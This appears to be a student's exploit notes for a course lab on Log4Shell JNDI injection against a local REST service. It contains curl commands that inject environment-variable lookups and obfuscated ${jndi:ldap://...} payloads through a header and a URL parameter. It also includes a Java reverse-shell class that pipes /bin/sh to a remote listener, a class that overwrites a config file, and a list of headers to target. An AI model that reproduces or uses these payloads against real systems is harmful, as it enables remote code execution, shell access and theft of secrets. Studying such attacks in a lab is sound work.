# Basic Exploit
```Bash
# Exploiting a Header
curl http://localhost:8080/rest/wizards/isAlive -H 'GATECH_ID: 904160213' -H 'Content-type: application/json' -H 'Referer: EXPLOIT ${env:ADMIN_PASSWORD}'

# Exploiting a parameter (URL Encoded) https://meyerweb.com/eric/tools/dencoder/
curl 'http://localhost:8080/rest/wizards/wizard/07577db4-f9ce-47f5-9508-61987ca4e987?darkArts=%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dndi%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Ddap%3A%2F%2F172.17.0.1%3A1389%2FExploit%7D' -H 'GATECH_ID:904160213' -H 'Accept: application/json' | python3 -m json.tool
```

# Java Exploits
```Java
### Getting a Shell ###
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    public Exploit() throws Exception {
        String host="192.168.1.25";        # Listen IP
        int port=9999;                     # Listen Port
        String[] cmd = {"/bin/sh"};        # Command to run
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();

        while(!s.isClosed()) {
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            } catch (Exception e) {}
        };
        p.destroy();
        s.close();
    }
}
```
```Java
### Overwriting the config.properties file ###
import java.io.*;
import java.util.Properties;

public class Exploit {
    static {
        try {
            File file = new File("config.properties");
            Properties props = new Properties();
	    if (!file.exists()) {
		    System.out.println("config.properties could not be found");
	    }

	    try (FileInputStream fis = new FileInputStream(file)) {
	    	props.load(fis);
	    }

            props.setProperty("magicPower", "904160213");

	    try (FileOutputStream fos = new FileOutputStream(file)) {
		    props.store(fos, null);
	    }

	    try (BufferedReader br = new BufferedReader(new FileReader(file))) {
		    String line;
		    while ((line = br.readLine()) != null) {
			    System.out.println(line);
		    }
	    }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

# Vulnerable Headers
```Bash
User-Agent
Referer 
X-Api-Version
X-Forwarded-For
Authentication
Contact
From
X-Wap-Profile
X-Original-URL
X-Forwarded-Proto
X-Forwarded-Server
Profile
Proxy-Host
Destination
Proxy
Via
True-Client-IP
Client-IP
X-Client-IP
X-Real-IP
X-Originating-IP
CF-Connecting_IP
Forwarded 
```
